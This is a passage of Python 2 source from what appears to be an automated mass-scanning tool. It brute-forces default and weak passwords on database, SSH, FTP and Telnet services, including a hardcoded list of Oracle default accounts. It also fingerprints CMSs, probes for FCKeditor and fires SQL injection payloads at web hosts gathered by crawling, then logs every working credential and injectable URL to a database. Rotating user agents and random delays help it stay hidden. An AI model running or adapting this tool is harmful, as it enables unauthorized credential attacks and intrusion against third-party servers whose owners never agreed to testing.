        s.connect((str(ip),3306))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for ppass in dic_pass:
                try:
                    connx = MySQLdb.connect(host=ip, user='root', passwd=str(ppass), db='test', port=3306,connect_timeout=10)
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                        cur_uauth_1 = coon_uauth_1.cursor()
                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip + ':3306|root|' + str(ppass)), str('Mysql数据库弱口令漏洞'), str(unauthorizedscan_title),str(timenow)))
                        coon_uauth_1.commit()
                        cur_uauth_1.close()
                        coon_uauth_1.close()
                        time.sleep(random.randint(2, 4))
                        return ''
                    except Exception, e:
                        pass
                except:
                    pass
        s.close()
    except:
        pass
    # Mssql弱口令
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Mssql Brute')
        s = socket.socket()
        s.connect((str(ip),1433))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for ppass in dic_pass:
                try:
                    connx = pymssql.connect(server=str(ip), port=1433, user='sa', password=str(ppass))
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                        cur_uauth_1 = coon_uauth_1.cursor()
                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip + ':1433|sa|' + str(ppass)), str('Mssql数据库弱口令漏洞'), str(unauthorizedscan_title),str(timenow)))
                        coon_uauth_1.commit()
                        cur_uauth_1.close()
                        coon_uauth_1.close()
                        time.sleep(random.randint(2, 4))
                        return ''
                    except Exception, e:
                        pass
                except:
                    pass
        s.close()
    except:
        pass
    # Postql弱口令
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Postsql Brute')
        s = socket.socket()
        s.connect((str(ip),5432))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for ppass in dic_pass:
                try:
                    connx = psycopg2.connect(host=ip, port=5432, user='postgres', password=ppass)
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                        cur_uauth_1 = coon_uauth_1.cursor()
                        sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                        cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip + ':5432|postgres|' + str(ppass)), str('Postgresql数据库弱口令漏洞'), str(unauthorizedscan_title),str(timenow)))
                        coon_uauth_1.commit()
                        cur_uauth_1.close()
                        coon_uauth_1.close()
                        time.sleep(random.randint(2, 4))
                        return ''
                    except Exception, e:
                        pass
                except:
                    pass
        s.close()
    except:
        pass
    # Oralce弱口令
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Oracle Brute')
        s = socket.socket()
        s.connect((str(ip),1521))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            # oracle默认用户及密码
            oracle_user = ['sys', 'system', 'sysman', 'scott', 'aqadm', 'Dbsnmp']
            oracle_pass_default = ['', 'manager', 'oem_temp', 'tiger', 'aqadm', 'dbsnmp']
            for uuser in oracle_user:
                for ppass in oracle_pass_default:
                    try:
                        connx = cx_Oracle.connect(uuser, ppass, ip+':1521/orcl')
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                            cur_uauth_1 = coon_uauth_1.cursor()
                            sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                            cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip + ':1521|' +str(uuser)+'|'+ str(ppass)), str('Oralce数据库弱口令漏洞'), str(unauthorizedscan_title),str(timenow)))
                            coon_uauth_1.commit()
                            cur_uauth_1.close()
                            coon_uauth_1.close()
                            time.sleep(random.randint(2, 4))
                            return ''
                        except Exception, e:
                            pass
                    except:
                        pass
        s.close()
    except:
        pass
    # SSH弱口令
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('SSH Brute')
        s = socket.socket()
        s.connect((str(ip), 22))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for uuser in dic_user:
                for ppass in dic_pass:
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(ip, port=22, username=uuser, password=ppass, timeout=10)
                        client.close()
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_uauth_1 = coon_uauth_1.cursor()
                            sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                            cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip + ':22|' + str(uuser) + '|' + str(ppass)), str('SSH弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                            coon_uauth_1.commit()
                            cur_uauth_1.close()
                            coon_uauth_1.close()
                            time.sleep(random.randint(2, 4))
                            return ''
                        except Exception, e:
                            pass
                    except:
                        pass
        s.close()
    except:
        pass
    # FTP弱口令
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('FTP Brute')
        s = socket.socket()
        s.connect((str(ip), 21))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            dic_user.append('anonymous')
            dic_pass.append('anonymous')
            dic_pass.append('')
            for uuser in dic_user:
                for ppass in dic_pass:
                    try:
                        ftp = FTP(ip)
                        ftp.connect(ip, 21)  # 连接 服务器名  端口号
                        ftp.login(str(uuser), str(ppass))
                        ftp.quit()  # ftpB.quit() #退出ftp服务器
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_uauth_1 = coon_uauth_1.cursor()
                            sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                            cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip + ':21|' + str(uuser) + '|' + str(ppass)), str('FTP弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                            coon_uauth_1.commit()
                            cur_uauth_1.close()
                            coon_uauth_1.close()
                            time.sleep(random.randint(2, 4))
                            return ''
                        except Exception, e:
                            pass
                    except:
                        pass
        s.close()
    except:
        pass
    # Telnet弱口令
    try:
        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Telnet Brute')
        s = socket.socket()
        s.connect((str(ip), 23))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for uuser in dic_user:
                for ppass in dic_pass:
                    try:
                        tn = telnetlib.Telnet(ip, timeout=10)
                        tn.set_debuglevel(5)
                        tn.read_until("ame:")
                        tn.write(uuser.encode('ascii') + "\r\n".encode('ascii'))
                        tn.read_until("ord:")
                        tn.write(ppass.encode('ascii') + "\r\n".encode('ascii'))
                        result = tn.read_some()
                        # result = result + tn.read_some()
                        if result.find('lgin') > 0 or result.find('ame') > 0 or result.find('Login failed') > 0 or result.find('incorrect') > 0 or result == ' ' or result.find('ail') > 0 or result.find('rror') > 0 or result.find('****')>0 or result.find('etry')>0  or result.find('after')>0 :
                            pass
                        else:
                            try:
                                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                                cur_uauth_1 = coon_uauth_1.cursor()
                                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                cur_uauth_1.execute(sql_uauth_1, (
                                str(url), str(ip + ':23|' + str(uuser) + '|' + str(ppass)), str('Telnet弱口令漏洞'),
                                str(unauthorizedscan_title), str(timenow)))
                                coon_uauth_1.commit()
                                cur_uauth_1.close()
                                coon_uauth_1.close()
                                time.sleep(random.randint(2, 4))
                                return ''
                            except Exception, e:
                                pass
                    except:
                        pass
                    try:
                        print str(threading.current_thread().name) + ' UAT>>>' + str(ip) + '-' + str('Telnet brute')
                        tn = telnetlib.Telnet(ip, timeout=10)
                        tn.set_debuglevel(5)
                        tn.read_until("ogin: ")
                        tn.write(uuser.encode('ascii') + "\r\n".encode('ascii'))
                        tn.read_until("word:")
                        tn.write(ppass.encode('ascii') + "\r\n".encode('ascii'))
                        result = tn.read_some()
                        # result = result + tn.read_some()
                        if result.find('lgin') > 0 or result.find('ame') > 0 or result.find('Login failed') > 0 or result.find('incorrect') > 0 or result == ' ' or result.find('ail') > 0 or result.find('rror') > 0 or result.find('****')>0 or result.find('etry')>0 or result.find('after')>0 :
                            pass
                        else:
                            try:
                                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                coon_uauth_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                                cur_uauth_1 = coon_uauth_1.cursor()
                                sql_uauth_1 = "INSERT INTO url_unauthorizedscan (url,ip,uauth,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                                cur_uauth_1.execute(sql_uauth_1, (str(url), str(ip + ':23|' + str(uuser) + '|' + str(ppass)), str('Telnet弱口令漏洞'),str(unauthorizedscan_title), str(timenow)))
                                coon_uauth_1.commit()
                                cur_uauth_1.close()
                                coon_uauth_1.close()
                                time.sleep(random.randint(2, 4))
                                return ''
                            except Exception, e:
                                pass
                    except:
                        pass
        s.close()
    except:
        pass

def scan_editor(url):
    # for ewebx in eweb:
    #     try:
    #         UA = random.choice(headerss)
    #         headers = {'User-Agent': UA}
    #         req_eweb_0= requests.head(url=str(url+ ewebx), headers=headers, allow_redirects=False,timeout=5)
    #         print str(threading.current_thread().name) + ' ' + str(req_eweb_0.url) + '  ' + str(req_eweb_0.status_code)
    #         #print 'Cheaking>>>' + req3.url + '  ' + str(req3.status_code)
    #         if req_eweb_0.status_code == 200:
    #             req_eweb_1 = requests.get(url=str(url + ewebx), headers=headers, allow_redirects=False, timeout=5)
    #             if ('editor') in req_eweb_1.content and req_eweb_1.status_code==200:
    #                 try:
    #                     timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    #                     coon_eweb_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
    #                     cur_eweb_1 = coon_eweb_1.cursor()
    #                     sql_eweb_1 = "INSERT INTO url_editor (url,datatime) VALUES (%s,%s)"
    #                     cur_eweb_1.execute(sql_eweb_1, (str(req_eweb_1.url), str(timenow)))
    #                     coon_eweb_1.commit()
    #                     cur_eweb_1.close()
    #                     coon_eweb_1.close()
    #                     time.sleep(random.randint(1, 3))
    #                 except:
    #                     pass
    #             else:
    #                 pass
    #     except Exception,e:
    #         pass
    for fckx in fck:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            req_fck_0= requests.head(url=str(url+ fckx), headers=headers, allow_redirects=False,timeout=5)
            print str(threading.current_thread().name) + ' ' + str(req_fck_0.url) + '  ' + str(req_fck_0.status_code)
            #print 'Cheaking>>>' + req3.url + '  ' + str(req3.status_code)
            if req_fck_0.status_code == 200:
                req_fck_1 = requests.get(url=str(url + fckx), headers=headers, allow_redirects=False,timeout=5)
                if ('title>FCKeditor - ') in req_fck_1.content and req_fck_1.status_code==200:
                    try:
                        fck_title = '获取网站标题失败'
                        r_fck_top = requests.get(url=url, headers=headers, timeout=5)
                        if r_fck_top.encoding == 'ISO-8859-1':
                            encodings = requests.utils.get_encodings_from_content(r_fck_top.text)
                            if encodings:
                                encoding = encodings[0]
                            else:
                                encoding = r_fck_top.apparent_encoding
                            encode_content = r_fck_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                            fck_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                                '<title>', '').replace('</title>', '')
                        elif r_fck_top.encoding == 'GB2312':
                            encodings = requests.utils.get_encodings_from_content(r_fck_top.text)
                            if encodings:
                                encoding = encodings[0]
                            else:
                                encoding = r_fck_top.apparent_encoding
                            encode_content = r_fck_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                            fck_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                                '<title>', '').replace('</title>', '')
                        elif r_fck_top.encoding == 'gb2312':
                            encodings = requests.utils.get_encodings_from_content(r_fck_top.text)
                            if encodings:
                                encoding = encodings[0]
                            else:
                                encoding = r_fck_top.apparent_encoding
                            encode_content = r_fck_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                            fck_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                                '<title>', '').replace('</title>', '')
                        elif r_fck_top.encoding == 'GBK':
                            encodings = requests.utils.get_encodings_from_content(r_fck_top.text)
                            if encodings:
                                encoding = encodings[0]
                            else:
                                encoding = r_fck_top.apparent_encoding
                            encode_content = r_fck_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                            fck_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                                '<title>', '').replace('</title>', '')
                        elif r_fck_top.encoding == 'gbk':
                            encodings = requests.utils.get_encodings_from_content(r_fck_top.text)
                            if encodings:
                                encoding = encodings[0]
                            else:
                                encoding = r_fck_top.apparent_encoding
                            encode_content = r_fck_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                            fck_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace(
                                '<title>', '').replace('</title>', '')
                        else:
                            fck_title = re.search('<title>(.*?)</title>', r_fck_top.content, re.S).group().replace(
                                '<title>', '').replace('</title>', '')
                    except:
                        try:
                            fck_title = re.search('<title>(.*?)</title>', r_fck_top.content, re.S).group().replace(
                                '<title>', '').replace('</title>', '')
                        except:
                            fck_title = '暂时无法获取网站标题'
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_fck_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_fck_1 = coon_fck_1.cursor()
                        sql_fck_1 = "INSERT INTO url_editor (url,urltitle,datatime) VALUES (%s,%s,%s)"
                        cur_fck_1.execute(sql_fck_1, (str(req_fck_1.url), str(fck_title),str(timenow)))
                        coon_fck_1.commit()
                        cur_fck_1.close()
                        coon_fck_1.close()
                        time.sleep(random.randint(1, 4))
                    except:
                        pass
                else:
                    pass
        except Exception,e:
            pass

def scan_cms(url):
    UA = random.choice(headerss)
    headers = {'User-Agent': UA}
    try:
        cms_title = '获取网站标题失败'
        r_cms_top = requests.get(url=url, headers=headers, timeout=5)
        if r_cms_top.encoding == 'ISO-8859-1':
            encodings = requests.utils.get_encodings_from_content(r_cms_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_cms_top.apparent_encoding
            encode_content = r_cms_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            cms_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_cms_top.encoding == 'GB2312':
            encodings = requests.utils.get_encodings_from_content(r_cms_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_cms_top.apparent_encoding
            encode_content = r_cms_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            cms_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_cms_top.encoding == 'gb2312':
            encodings = requests.utils.get_encodings_from_content(r_cms_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_cms_top.apparent_encoding
            encode_content = r_cms_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            cms_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_cms_top.encoding == 'GBK':
            encodings = requests.utils.get_encodings_from_content(r_cms_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_cms_top.apparent_encoding
            encode_content = r_cms_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            cms_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        elif r_cms_top.encoding == 'gbk':
            encodings = requests.utils.get_encodings_from_content(r_cms_top.text)
            if encodings:
                encoding = encodings[0]
            else:
                encoding = r_cms_top.apparent_encoding
            encode_content = r_cms_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
            cms_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>', '').replace(
                '</title>', '')
        else:
            cms_title = re.search('<title>(.*?)</title>', r_cms_top.content, re.S).group().replace('<title>',
                                                                                                   '').replace(
                '</title>', '')
    except:
        try:
            cms_title = re.search('<title>(.*?)</title>', r_cms_top.content, re.S).group().replace('<title>',
                                                                                                   '').replace(
                '</title>', '')
        except:
            cms_title = '暂时无法获取网站标题'
    try:
        req3 = requests.get(url=url, headers=headers, timeout=5)
        #print 'Cheaking>>>' + req3.url + '  ' + str(req3.status_code)
        print str(threading.current_thread().name) + ' ' + str(req3.url).strip('/') + '  ' + str(req3.status_code)
        for key,valu in body.iteritems():
            if key in req3.content:
                try:
                    timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    coon_cms_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                    cur_cms_1 = coon_cms_1.cursor()
                    sql_cms_1 = "INSERT INTO url_cms (url,urlway,cmstype,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                    cur_cms_1.execute(sql_cms_1, (str(url), str(key),str(valu),str(cms_title), str(timenow)))
                    coon_cms_1.commit()
                    cur_cms_1.close()
                    coon_cms_1.close()
                    return ''
                except:
                    pass
            else:
                pass
    except Exception,e:
        pass

    UA = random.choice(headerss)
    headers = {'User-Agent': UA}
    urlx = str(url) + '/robots.txt'
    try:
        req2 = requests.get(url=urlx,headers=headers,timeout=3,allow_redirects=False)
        #print 'Cheaking>>>' + req2.url + '  ' + str(req2.status_code)
        print str(threading.current_thread().name) + ' ' + str(req2.url) + '  ' + str(req2.status_code)
        for x_x in robots:
            if x_x in req2.content:
                try:
                    timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    coon_cms_2 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                    cur_cms_2 = coon_cms_2.cursor()
                    sql_cms_2 = "INSERT INTO url_cms (url,urlway,cmstype,urltitle,datatime) VALUES (%s,%s,%s,%s,%s)"
                    cur_cms_2.execute(sql_cms_2, (str(url), str('robots.txt'),str(x_x),str(cms_title), str(timenow)))
                    coon_cms_2.commit()
                    cur_cms_2.close()
                    coon_cms_2.close()
                    return ''
                except:
                    pass
            else:
                pass
    except Exception,e:
        pass

    f = codecs.open('cms.txt', 'r', 'gbk')
    for cmsxx in f.readlines():
        cmshouzhui = cmsxx.split('|', 3)[0]
        cmsmd5 = cmsxx.split('|', 3)[2]
        cmsname = cmsxx.split('|', 3)[1]
        urlcms = str(url) + str(cmshouzhui)
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            req1 = requests.head(url=urlcms,headers=headers,timeout=5,allow_redirects=False)
            print str(threading.current_thread().name) + ' ' + str(req1.url) + '  ' + str(req1.status_code)
            if req1.status_code == 200:
                req1_2 = requests.get(url=urlcms,headers=headers,timeout=5,allow_redirects=False)
                md5 = hashlib.md5()
                md5.update(req1_2.content)
                rmd5 = md5.hexdigest()
                if rmd5 == cmsmd5:
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_cms_3 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_cms_3 = coon_cms_3.cursor()
                        sql_cms_3 = "INSERT INTO url_cms (url,urlway,cmstype,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                        cur_cms_3.execute(sql_cms_3, (str(url), str(urlcms), str(cmsname),str(cms_title), str(timenow)))
                        coon_cms_3.commit()
                        cur_cms_3.close()
                        coon_cms_3.close()
                        return ''
                    except:
                        pass

            else:
                pass
        except Exception,e:
            pass
            #print e

def crawl_sql(url):
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r_crawl = requests.get(url=url, headers=headers, timeout=5)
        r_sql = re.findall('href="(.*?)"', r_crawl.content)
        list_none = []
        for sql_sql in r_sql:
            if 'php?' in sql_sql:
                if not 'http' in sql_sql and not 'jsvascript' in sql_sql:
                    list_none.append(sql_sql.lstrip('/'))
                else:
                    pass
            else:
                pass
            if 'asp?' in sql_sql:
                if not 'http' in sql_sql and not 'jsvascript' in sql_sql:
                    list_none.append(sql_sql.lstrip('/'))
                else:
                    pass
            else:
                pass
            if 'aspx?' in sql_sql:
                if not 'http' in sql_sql and not 'jsvascript' in sql_sql:
                    list_none.append(sql_sql.lstrip('/'))
                else:
                    pass
            else:
                pass
            if 'jsp?' in sql_sql:
                if not 'http' in sql_sql and not 'jsvascript' in sql_sql:
                    list_none.append(sql_sql.lstrip('/'))
                else:
                    pass
            else:
                pass
        sql_address = url + '/' + list_none[1]
        try:
            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            coon_sql_1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
            cur_sql_1 = coon_sql_1.cursor()
            sql_sql_1 = "INSERT INTO url_sqlinj_log (url,urlget,datatime) VALUES (%s,%s,%s)"
            cur_sql_1.execute(sql_sql_1, (str(sql_address),str(0),str(timenow)))
            coon_sql_1.commit()
            cur_sql_1.close()
            coon_sql_1.close()
            time.sleep(random.randint(2, 6))
        except Exception, e:
            pass
    except Exception,e:
        pass
def scan_sql(url):
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        try:
            sql_title = '获取网站标题失败'
            r_inj_top = requests.get(url=url, headers=headers, timeout=5)
            if r_inj_top.encoding == 'ISO-8859-1':
                encodings = requests.utils.get_encodings_from_content(r_inj_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_inj_top.apparent_encoding
                encode_content = r_inj_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                sql_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                    '').replace(
                    '</title>', '')
            elif r_inj_top.encoding == 'GB2312':
                encodings = requests.utils.get_encodings_from_content(r_inj_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_inj_top.apparent_encoding
                encode_content = r_inj_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                sql_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                    '').replace(
                    '</title>', '')
            elif r_inj_top.encoding == 'gb2312':
                encodings = requests.utils.get_encodings_from_content(r_inj_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_inj_top.apparent_encoding
                encode_content = r_inj_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                sql_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                    '').replace(
                    '</title>', '')
            elif r_inj_top.encoding == 'GBK':
                encodings = requests.utils.get_encodings_from_content(r_inj_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_inj_top.apparent_encoding
                encode_content = r_inj_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                sql_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                    '').replace(
                    '</title>', '')
            elif r_inj_top.encoding == 'gbk':
                encodings = requests.utils.get_encodings_from_content(r_inj_top.text)
                if encodings:
                    encoding = encodings[0]
                else:
                    encoding = r_inj_top.apparent_encoding
                encode_content = r_inj_top.content.decode(encoding, 'replace').encode('utf-8', 'replace')
                sql_title = re.search('<title>(.*?)</title>', encode_content, re.S).group().replace('<title>',
                                                                                                    '').replace(
                    '</title>', '')
            else:
                sql_title = re.search('<title>(.*?)</title>', r_inj_top.content, re.S).group().replace('<title>',
                                                                                                       '').replace(
                    '</title>', '')
        except:
            try:
                sql_title = re.search('<title>(.*?)</title>', r_inj_top.content, re.S).group().replace('<title>',
                                                                                                       '').replace(
                    '</title>', '')
            except:
                sql_title = '暂时无法获取网站标题'
        for inj in payloads:
            url_inj = url + str(inj)
            r_inj = requests.get(url=url_inj, headers=headers, timeout=5)
            print str(threading.current_thread().name) + ' ' + str(r_inj.url) + '  ' + str(r_inj.status_code)
            for key, vlue in sql_errors.iteritems():
                if str(key) in r_inj.content:
                    try:
                        timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        coon_sql_2 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                        cur_sql_2 = coon_sql_2.cursor()
                        sql_sql_2 = "INSERT INTO url_sqlinj (url,urltitle,sqldatabase,datatime) VALUES (%s,%s,%s,%s)"
                        cur_sql_2.execute(sql_sql_2, (str(url_inj), str(sql_title),str('数据库显错注入:'+str(vlue)), str(timenow)))
                        coon_sql_2.commit()
                        cur_sql_2.close()
                        coon_sql_2.close()
                        time.sleep(random.randint(2, 6))
                        return ''
                    except:
                        pass
                else:
                    pass
    except Exception, e:
        # print e
        pass
#核心扫描功能完成

def first_scan(url):
    UA = random.choice(headerss)
    headers = {'User-Agent': UA}
    try:
        first_r = requests.get(url=url,headers=headers,timeout=5)
        for first_url in first_cule:
            patt = re.compile(str('http' +'.*?' + str(first_url)))
            try:
                first_re = re.findall(patt, first_r.content)
                for first_u_url in first_re:
                    first_u_url_1 = first_u_url.replace('%3A%2F%2F', '//').replace('\/\/', '//').replace('">','').replace("/'>", "").replace('/"', '')
                    if ' ' in first_u_url_1:
                        pass
                    if 'www' in first_u_url_1.split('http://')[1] and len(first_u_url_1) < 52:
                        list_001.append(first_u_url_1)
            except Exception, e:
                pass
                #print e
    except Exception,e:
        pass
        #print e

if int(New_start) == 1:
    list_001 = []
    first_input = 'Yolanda_get_url.txt'
    time.sleep(1)
    print unicode('\n*****原始外部链接载入成功*****', 'utf-8')
    time.sleep(1)
    first_url_txt = list(set([i.replace("\n", "") for i in open(first_input, "r").readlines()]))
    print unicode('*****正在提取外链，稍等*****', 'utf-8')
    for first_1 in first_url_txt:
        first_scan(first_1)
    list_001 = list(set(list_001))
    print unicode('*****原始外链提取成功*****', 'utf-8')
    time.sleep(2)
    cfg.set("Config", "New_start",0)
    cfg.write(open('config.ini', 'w'))
    print unicode('开始写入数据库', 'utf-8')
    try:
        coon = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        #cur = coon.cursor(pymysql.cursors.SSCursor)
        cur = coon.cursor()
        print unicode('数据库连接成功', 'utf-8')
        for xx_0 in list_001:
            xx = xx_0.strip('/')
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                urlxieru = requests.head(url=str(xx),headers=headers,timeout=3)
                print str(threading.current_thread().name) + ' ' + str(urlxieru.url).strip('/') + '  ' + str(urlxieru.status_code)
                if urlxieru.status_code == 200:
                    timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    sql = "INSERT INTO url_index(url,urlget,datatime) select '%s','%s','%s' from dual where '%s' not in (select url from url_index)"%(str(xx),'0', str(timenow),str(xx))
                    cur.execute(sql)
                    coon.commit()
                    sql001 = "INSERT INTO url_check(url,cmsscan,rarscan,sqlscan,st2scan,editorscan,portscan,unauthorizedscan,datatime) select '%s','%s','%s','%s','%s','%s','%s','%s','%s' from dual where '%s' not in (select url from url_check)"%((str(xx),0,0,0,0,0,0,0,str(timenow),str(xx)))
                    cur.execute(sql001)
                    coon.commit()
                else:
                    pass
            except Exception,e:
                pass
                #print e
    except:
        print unicode('无法写入数据库，检查配置文件及系统环境', 'utf-8')
        time.sleep(300)
    finally:
        cur.close()
        coon.close()


def wuxiancaiji(url):
    list_002 = []
    UA = random.choice(headerss)
    headers = {'User-Agent': UA}
    try:
        wuxiancaiji_r = requests.get(url=url, headers=headers, timeout=5, allow_redirects=False)
        try:
            for wuxiancaiji_url in first_cule:
                patt_wuxiancaiji = re.compile('http' + '.*?' + str(wuxiancaiji_url))
                wuxiancaiji_re = re.findall(patt_wuxiancaiji, wuxiancaiji_r.content)
                for wuxiancaiji_u_url in wuxiancaiji_re:
                    wuxiancaiji_u_url_1 = wuxiancaiji_u_url.replace('%3A%2F%2F', '//').replace('\/\/','//').replace('">','').replace("/'>", "").replace('/"', '')
                    if ' ' in wuxiancaiji_u_url_1:
                        pass
                    if len(wuxiancaiji_u_url_1) > 52:
                        pass
                    else:
                        list_002.append(wuxiancaiji_u_url_1)
                        list_002_1 = list(set(list_002))
            list_002_1 = list(set(list_002))
            try:
                for xx_x0 in list_002_1:
                    xxx = xx_x0.strip('/')
                    try:
                        if xxx.find('.')<3 or xxx.find('www')>0:
                            UA = random.choice(headerss)
                            headers = {'User-Agent': UA}
                            xieru2 = requests.head(url=str(xxx), headers=headers, timeout=5)
